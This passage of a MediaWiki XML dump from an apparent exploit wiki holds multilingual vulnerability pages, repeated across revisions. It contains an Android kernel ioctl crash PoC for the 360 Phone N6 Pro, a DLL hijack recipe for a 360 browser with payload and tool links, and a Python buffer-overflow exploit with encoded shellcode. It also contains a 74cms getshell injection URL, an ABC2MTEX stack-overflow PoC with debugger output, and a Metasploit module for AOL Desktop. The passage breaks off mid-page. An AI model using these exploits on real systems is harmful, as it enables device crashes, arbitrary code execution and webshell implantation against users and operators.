360 Phone N6 Pro V096內核組件中的內核模塊允許攻擊者使用命令3235427072在設備&lt;code&gt;/dev/block/mmcblk0rpmb&lt;/code&gt;上通過ioctl的自變量注入精心設計的自變量，並導致內核崩潰。
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==漏洞影響==
&lt;/div&gt;

360 Phone N6 Pro 1801-A01

==POC==
&lt;pre&gt;
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd &lt; 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 &gt; /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) &lt; 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 &gt; /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
&lt;/pre&gt;</text>
      <sha1>rf8fcoxlw6enahjgzwwvqrkkapm4x19</sha1>
    </revision>
    <revision>
      <id>1790</id>
      <parentid>1786</parentid>
      <timestamp>2021-04-20T07:39:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Принцип уязвимости=="</comment>
      <origin>1790</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1630" sha1="t46p2x9uny9uo53o9citj6t1sg5r2of" xml:space="preserve">&lt;languages   /&gt;
==Принцип уязвимости==

Модуль ядра в сборке ядра 360 Phone N6 Pro V096 позволяет злоумышленнику использовать команду 3235427072 для впрыскивания сложной переменной self через переменную self ioctl на устройстве &lt;code&gt;/dev/block/mmcblk0rpmb&lt;/code&gt; и приводить к отказу ядра.

==Воздействие уязвимости==

360 Phone N6 Pro 1801-A01

==POC==
&lt;pre&gt;
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd &lt; 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 &gt; /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) &lt; 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 &gt; /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
&lt;/pre&gt;</text>
      <sha1>t46p2x9uny9uo53o9citj6t1sg5r2of</sha1>
    </revision>
  </page>
  <page>
    <title>360 Phone N6 Pro內核漏洞/yue</title>
    <ns>0</ns>
    <id>1388</id>
    <revision>
      <id>1752</id>
      <timestamp>2021-04-20T03:15:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞原理=="</comment>
      <origin>1752</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1459" sha1="ilrb53zm48dltc8nc3zfw7krk02d6a9" xml:space="preserve">&lt;languages   /&gt;
==漏洞原理==

360 Phone N6 Pro V096內核組件中嘅內核模塊允許攻擊者使用命令3235427072喺設備&lt;code&gt;/dev/block/mmcblk0rpmb&lt;/code&gt;上通過ioctl嘅自變量注入精心設計嘅自變量，並導致內核崩潰。

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==漏洞影響==
&lt;/div&gt;

360 Phone N6 Pro 1801-A01

==POC==
&lt;pre&gt;
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd &lt; 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 &gt; /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) &lt; 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 &gt; /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
&lt;/pre&gt;</text>
      <sha1>ilrb53zm48dltc8nc3zfw7krk02d6a9</sha1>
    </revision>
    <revision>
      <id>1754</id>
      <parentid>1752</parentid>
      <timestamp>2021-04-20T03:16:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響=="</comment>
      <origin>1754</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1398" sha1="jvprzl7iwv2ed880kdz09oltk66r65z" xml:space="preserve">&lt;languages   /&gt;
==漏洞原理==

360 Phone N6 Pro V096內核組件中嘅內核模塊允許攻擊者使用命令3235427072喺設備&lt;code&gt;/dev/block/mmcblk0rpmb&lt;/code&gt;上通過ioctl嘅自變量注入精心設計嘅自變量，並導致內核崩潰。

==漏洞影響==

360 Phone N6 Pro 1801-A01

==POC==
&lt;pre&gt;
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd &lt; 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 &gt; /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) &lt; 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 &gt; /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
&lt;/pre&gt;</text>
      <sha1>jvprzl7iwv2ed880kdz09oltk66r65z</sha1>
    </revision>
  </page>
  <page>
    <title>360 Phone N6 Pro內核漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3530</id>
    <revision>
      <id>4104</id>
      <timestamp>2021-06-06T08:31:31Z</timestamp>
      <contributor>
        <username>Xl199928</username>
        <id>290</id>
      </contributor>
      <comment>Created page with "==漏洞原理=="</comment>
      <origin>4104</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1520" sha1="nrum6wzqn13vhgkmkdkt2ji39l09sbc" xml:space="preserve">&lt;languages   /&gt;
==漏洞原理==

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
360 Phone N6 Pro V096內核組件中的內核模塊允許攻擊者使用命令3235427072在設備&lt;code&gt;/dev/block/mmcblk0rpmb&lt;/code&gt;上通過ioctl的自變量注入精心設計的自變量，並導致內核崩潰。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞影響==
&lt;/div&gt;

360 Phone N6 Pro 1801-A01

==POC==
&lt;pre&gt;
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd &lt; 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 &gt; /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) &lt; 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 &gt; /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
&lt;/pre&gt;</text>
      <sha1>nrum6wzqn13vhgkmkdkt2ji39l09sbc</sha1>
    </revision>
    <revision>
      <id>4107</id>
      <parentid>4104</parentid>
      <timestamp>2021-06-06T08:36:00Z</timestamp>
      <contributor>
        <username>Xl199928</username>
        <id>290</id>
      </contributor>
      <comment>Created page with "360 Phone N6 Pro内核漏洞"</comment>
      <origin>4107</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1398" sha1="ckz4p0blxdihpwvux250295wrjo16ms" xml:space="preserve">&lt;languages   /&gt;
==漏洞原理==

360 Phone N6 Pro V096内核组件中的内核模块允许攻击者使用命令3235427072在设备&lt;code&gt;/dev/block/mmcblk0rpmb&lt;/code&gt;上通过ioctl的自变量注入精心设计的自变量，并导致内核崩溃。

==漏洞影响==

360 Phone N6 Pro 1801-A01

==POC==
&lt;pre&gt;
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd &lt; 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 &gt; /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) &lt; 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 &gt; /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
&lt;/pre&gt;</text>
      <sha1>ckz4p0blxdihpwvux250295wrjo16ms</sha1>
    </revision>
  </page>
  <page>
    <title>360極速瀏覽器 11.0.2086.0 dll劫持漏洞</title>
    <ns>0</ns>
    <id>1314</id>
    <revision>
      <id>1652</id>
      <timestamp>2021-04-14T05:08:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞原理== 瀏覽器啟動時,會自動加載當前目錄下載dll模塊，在加載系統dll，若發現存在dll模塊存在時,瀏覽器就會調用該dll模塊執行..."</comment>
      <origin>1652</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="998" sha1="rbbw5h6c9nz9ou6nwuhnszlmxommdis" xml:space="preserve">==漏洞原理==
瀏覽器啟動時,會自動加載當前目錄下載dll模塊，在加載系統dll，若發現存在dll模塊存在時,瀏覽器就會調用該dll模塊執行。如果加載中未發現dll，攻擊者可以構造一個惡意dll。

==漏洞利用==

===需要的工具===
Procmon漢化版 v3.20.0.0

dll模塊（可自己編寫32位，兼容性。）

DllHijackAuditor （自動化工具效果不是太好）

procexp


===360可以劫持的dll===

api-ms-win-core-localization-l1-2-1.dll
api-ms-win-core-fibers-l1-1-1.dll

放在根目錄下，也可以在其他目錄。

Payload: https://github.com/JustYoomoon/Exploit/blob/main/payload.dll

可以看出來加載了計算器。


==自動化工具==
http://www.onlinedown.net/soft/636085.htm

https://cdn.securityxploded.com/download/DllHijackAuditor.zip

https://github.com/MojtabaTajik/Robber/releases/tag/1.5

https://github.com/rootm0s/WinPwnage

https://github.com/mojtabatajik/robber

https://github.com/sensepost/rattler</text>
      <sha1>rbbw5h6c9nz9ou6nwuhnszlmxommdis</sha1>
    </revision>
  </page>
  <page>
    <title>3GP Video Converter本地緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>503</id>
    <revision>
      <id>706</id>
      <timestamp>2021-03-27T03:14:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/env python 1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0 0     _                   __           __       __..."</comment>
      <origin>706</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3388" sha1="nmqhgzxqj3s56wzoibsfwz2whkxzvcg" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/env python
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_&lt;_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ &gt;&gt; Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                   0
1  [+] Support e-mail  : submit[at]1337day.com                         1
0                                                                      0
1               #########################################              1
0               I'm Angel Injection member from Inj3ct0r Team          1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
###################################################################
#
# Exploit Title: 3GP Video Converter Local Buffer Overflow
# Author: Angel Injection
# Date: 17/9/2011
# Thanks To: Inj3ct0r Owners | r0073r // Sid3^effects // r4dc0re // CrosS || Inj3ct0r Team || SeeMe // XroGuE // gunslinger_ // indoushka // KnocKout // ZoRLu //anT!-Tr0J4n // eXeSoul // KedAns-Dz // ^Xecuti0n3r // Kalashinkov3
#
###################################################################
 
start = "\x5e\x3d\x6d\x77\x66\x64\x55\x6c\x61\x79\x5d\x0e\x0d\x46\x69\x6f\x65\x4a\x61\x6e\x65\x30\x3d\x43\x3a\x5e"
junk = '\x90' * 2100
eip = '\xF7\x30\x9E\x7E'
nops = '\x90'*20
 
# msfpayload windows/exec CMD=calc.exe R | msfencode -a x86 -t c
sc = ("\xbe\x41\x9e\x4e\xd0\x33\xc9\xda\xd7\xd9\x74\x24\xf4\xb1\x33"
"\x58\x31\x70\x10\x83\xe8\xfc\x03\x31\x92\xac\x25\x4d\x42\xb9"
"\xc6\xad\x93\xda\x4f\x48\xa2\xc8\x34\x19\x97\xdc\x3f\x4f\x14"
"\x96\x12\x7b\xaf\xda\xba\x8c\x18\x50\x9d\xa3\x99\x54\x21\x6f"
"\x59\xf6\xdd\x6d\x8e\xd8\xdc\xbe\xc3\x19\x18\xa2\x2c\x4b\xf1"
"\xa9\x9f\x7c\x76\xef\x23\x7c\x58\x64\x1b\x06\xdd\xba\xe8\xbc"
"\xdc\xea\x41\xca\x97\x12\xe9\x94\x07\x23\x3e\xc7\x74\x6a\x4b"
"\x3c\x0e\x6d\x9d\x0c\xef\x5c\xe1\xc3\xce\x51\xec\x1a\x16\x55"
"\x0f\x69\x6c\xa6\xb2\x6a\xb7\xd5\x68\xfe\x2a\x7d\xfa\x58\x8f"
"\x7c\x2f\x3e\x44\x72\x84\x34\x02\x96\x1b\x98\x38\xa2\x90\x1f"
"\xef\x23\xe2\x3b\x2b\x68\xb0\x22\x6a\xd4\x17\x5a\x6c\xb0\xc8"
"\xfe\xe6\x52\x1c\x78\xa5\x38\xe3\x08\xd3\x05\xe3\x12\xdc\x25"
"\x8c\x23\x57\xaa\xcb\xbb\xb2\x8f\x24\xf6\x9f\xb9\xac\x5f\x4a"
"\xf8\xb0\x5f\xa0\x3e\xcd\xe3\x41\xbe\x2a\xfb\x23\xbb\x77\xbb"
"\xd8\xb1\xe8\x2e\xdf\x66\x08\x7b\xbc\xe9\x9a\xe7\x6d\x8c\x1a"
"\x8d\x71")
 
exploit = junk + eip + nops + sc
rest = '\x90'*(2000-len(exploit))
end="\x2d\x6d\x72\x44\x0d\x0e\x45\x69\x6c\x65\x4e\x61\x6d\x65\x31\x3d\x0d\x0a\x4e\x75\x6d\x46\x69\x6c\x65\x73\x3d\x31\x0d\x0a"
 
try:
    f = open("exploit.3gp","w");
    f.write(start+exploit+rest+end)
    f.close()
    print "Done!"
except:
    print "Exploit By Inj3ct0r Team"


&lt;/pre&gt;</text>
      <sha1>nmqhgzxqj3s56wzoibsfwz2whkxzvcg</sha1>
    </revision>
  </page>
  <page>
    <title>74cms v4.2.1-v4.2.129 後台getshell漏洞</title>
    <ns>0</ns>
    <id>2043</id>
    <revision>
      <id>2468</id>
      <timestamp>2021-05-05T06:40:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞利用== 管理面板-風格模板-工具-點擊可用模板抓包  &lt;pre&gt; url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= ', 'a',phpinfo(),'  webshell:ht..."</comment>
      <origin>2468</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="279" sha1="acvo6zhnk2nb8ynn6vqpszzfff2m0sj" xml:space="preserve">==漏洞利用==
管理面板-風格模板-工具-點擊可用模板抓包

&lt;pre&gt;
url: http://74cms.test/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir= ', 'a',phpinfo(),'

webshell:http://74cms.test/Application/Home/Conf/config.php


\74cms\upload\Application\Home\Conf\config.php
&lt;/pre&gt;</text>
      <sha1>acvo6zhnk2nb8ynn6vqpszzfff2m0sj</sha1>
    </revision>
  </page>
  <page>
    <title>ABC2MTEX 1.6.1 命令行堆棧溢出漏洞</title>
    <ns>0</ns>
    <id>1602</id>
    <revision>
      <id>2005</id>
      <timestamp>2021-05-02T04:24:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; Exploit Title: ABC2MTEX 1.6.1 - Command Line Stack Overflow Date: 2019-08-13 Exploit Author: Carter Yagemann &lt;yagemann@gatech.edu&gt; Vendor Homepage: https://abcno..."</comment>
      <origin>2005</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2663" sha1="lzqxenwytj65o9oweh3d2bhu4h3rk9l" xml:space="preserve">==EXP==
&lt;pre&gt;
Exploit Title: ABC2MTEX 1.6.1 - Command Line Stack Overflow
Date: 2019-08-13
Exploit Author: Carter Yagemann &lt;yagemann@gatech.edu&gt;
Vendor Homepage: https://abcnotation.com/abc2mtex/
Software Link: https://github.com/mudongliang/source-packages/raw/master/CVE-2004-1257/abc2mtex1.6.1.tar.gz
Version: 1.6.1
Tested on: Debian Buster

An unsafe strcpy at abc.c:241 allows an attacker to overwrite the return
address from the openIn function by providing a long input filename. This
carries similar risk to CVE-2004-1257.

Setup:

$ wget https://github.com/mudongliang/source-packages/raw/master/CVE-2004-1257/abc2mtex1.6.1.tar.gz
$ tar -xzf abc2mtex1.6.1.tar.gz
$ make

$ gcc --version
gcc (Debian 8.3.0-6) 8.3.0
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

PoC:

$ ./abc2mtex AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFEDCBA

GDB:

We're going to place a breakpoint before and after abc.c:241 to show the overflow.

$ gdb -q ./abc2mtex
Reading symbols from ./abc2mtex...done.
(gdb) break abc.c:241
Breakpoint 1 at 0x4139: file abc.c, line 241.
(gdb) break abc.c:242
Breakpoint 2 at 0x414c: file abc.c, line 242.
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFEDCBA
Starting program: /tmp/tmp.4jy8nhwOI3/abc2mtex AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFEDCBA

Breakpoint 1, openIn (filename=0x7fffffffe240 'A' &lt;repeats 120 times&gt;, "FEDCBA") at abc.c:241
241                     (void) strcpy(savename,filename);
(gdb) bt
#0  openIn (filename=0x7fffffffe240 'A' &lt;repeats 120 times&gt;, "FEDCBA") at abc.c:241
#1  0x0000555555556f00 in main (argc=2, argv=0x7fffffffe4f8) at fields.c:273
(gdb) c
Continuing.

Breakpoint 2, openIn (filename=0x7fffffffe240 'A' &lt;repeats 120 times&gt;, "FEDCBA") at abc.c:242
242                     (void) strcat(filename,".abc");
(gdb) bt
#0  openIn (filename=0x7fffffffe240 'A' &lt;repeats 120 times&gt;, "FEDCBA") at abc.c:242
#1  0x0000414243444546 in ?? ()
#2  0x00007fffffffe4f8 in ?? ()
#3  0x0000000200000000 in ?? ()
#4  0x0000000000000000 in ?? ()
(gdb) c
Continuing.
file "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFEDCBA" does not exist

Program received signal SIGSEGV, Segmentation fault.
0x0000414243444546 in ?? ()
(gdb) quit
            
&lt;/pre&gt;</text>
      <sha1>lzqxenwytj65o9oweh3d2bhu4h3rk9l</sha1>
    </revision>
  </page>
  <page>
    <title>AOL Desktop 9.6 RTX緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>490</id>
    <revision>
      <id>692</id>
      <timestamp>2021-03-27T02:58:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # $Id: aol_desktop_linktag.rb 12284 2011-04-08 23:09:31Z sinn3r $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistributio..."</comment>
      <origin>692</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3840" sha1="83fu1buetj3g21pt8e2jou4vgy1py2v" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# $Id: aol_desktop_linktag.rb 12284 2011-04-08 23:09:31Z sinn3r $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info={})
		super(update_info(info,
			'Name'           =&gt; "AOL Desktop 9.6 RTX Buffer Overflow",
			'Description'    =&gt; %q{
					This module exploits a vulnerability found in AOL Desktop 9.6's Tool\rich.rct
				component. By supplying a long string of data in the hyperlink tag, rich.rct copies
				this data into a buffer using a strcpy function, which causes an overflow, and
				results arbitritray code execution.
			},
			'License'	     =&gt; MSF_LICENSE,
			'Version'	     =&gt; "$Revision: 12284 $",
			'Author'         =&gt;
				[
					'sup3r',     #Initial disclosure, poc (9.5)
					'sickn3ss',  #9.6 poc
					'sinn3r',    #Metasploit
				],
			'References'     =&gt;
				[
					[ 'OSVDB', '70741'],
					[ 'URL', 'http://www.exploit-db.com/exploits/16085/' ],
				],
			'Payload'	     =&gt;
				{
					'BadChars' =&gt; "\x00\x0d\x0a\x3e\x7f",
					'StackAdjustment' =&gt; -3500,
				},
			'DefaultOptions' =&gt;
				{
					'ExitFunction' =&gt; "process",
				},
			'Platform'       =&gt; 'win',	
			'Targets'	     =&gt;
				[
					[
						'AOL Desktop 9.6 on Windows XP SP3',
						{
							'Ret'=&gt;0x01DB4542,  #0x01DB4542 JMP ESI
							'Offset'=&gt;5391,     #Offset to EIP
							'Max'=&gt;8000,        #Buffer max. Can be more.
						},
					],
				],
			'Privileged'	 =&gt; false,
			'DisclosureDate' =&gt; "Jan 31 2011",
			'DefaultTarget'  =&gt; 0))

			register_options(
				[
					OptString.new( 'FILENAME', [false, 'The filename', 'msf.rtx'] ),
				]
			)
	end

	def exploit

		# Compatible with what the poc has, and what I see on my debugger
		sploit  = ''
		sploit &lt;&lt; rand_text_alpha(4968+16)
		sploit &lt;&lt; payload.encoded
		sploit &lt;&lt; rand_text_alpha(5368-sploit.length)
		sploit &lt;&lt; make_nops(11)
		sploit &lt;&lt; "\xe9\x70\xfe\xff\xff"  #JMP back 400 bytes
		sploit &lt;&lt; [target.ret].pack('V')
		sploit &lt;&lt; make_nops(target['Offset']-sploit.length-2)
		sploit &lt;&lt; "\xeb\x04"
		sploit &lt;&lt; [target.ret].pack('V')
		sploit &lt;&lt; payload.encoded
		sploit &lt;&lt; rand_text_alpha(target['Max']-sploit.length)

		link_value = rand_text_alpha(6)

		rtx  = "&lt;HTML&gt;"
		rtx &lt;&lt; "&lt;A HREF=\"#{sploit}\"&gt;#{link_value}&lt;/A&gt;"
		rtx &lt;&lt; "&lt;/HTML&gt;"

		print_status("Creating #{datastore['FILENAME']}...")
		file_create(rtx)
	end
end

=begin
0:000&gt; g
Breakpoint 0 hit
eax=00000006 ebx=06652370 ecx=02d9c898 edx=038d0000 esi=00000000 edi=02d99b30
eip=6909e187 esp=0022e638 ebp=0022e648 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
rich!ToolInit+0xed2c:
6909e187 e85cd50300      call    rich!ToolInit+0x4c28d (690db6e8)
0:000&gt; g
(8d8.924): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=02d38358 ecx=00000000 edx=00000030 esi=02d53cb8 edi=0022e7c4
eip=43434343 esp=0022e760 ebp=0022e780 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210202
43434343 ??              ???
0:000&gt; dd esi
02d53cb8  43434343 43434343 43434343 43434343
02d53cc8  43434343 43434343 43434343 43434343
02d53cd8  43434343 43434343 43434343 43434343
02d53ce8  43434343 43434343 43434343 43434343
02d53cf8  43434343 43434343 43434343 43434343
02d53d08  43434343 43434343 43434343 43434343
02d53d18  43434343 43434343 43434343 43434343
02d53d28  43434343 43434343 43434343 43434343
=end
&lt;/pre&gt;</text>
      <sha1>83fu1buetj3g21pt8e2jou4vgy1py2v</sha1>
    </revision>
  </page>
  <page>
    <title>ASUS DisplayWidget Software 3.4.0.036 - 'ASUSDisplayWidgetService' Unquoted Service Path</title>
    <ns>0</ns>
    <id>4818</id>
    <revision>
      <id>5552</id>
      <timestamp>2021-06-23T00:05:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; # Exploit Title: ASUS DisplayWidget Software 3.4.0.036 - 'ASUSDisplayWidgetService' Unquoted Service Path # Date: 2021-06-21 # Exploit Author: Julio Aviña # Vendor Home..."</comment>
      <origin>5552</origin>
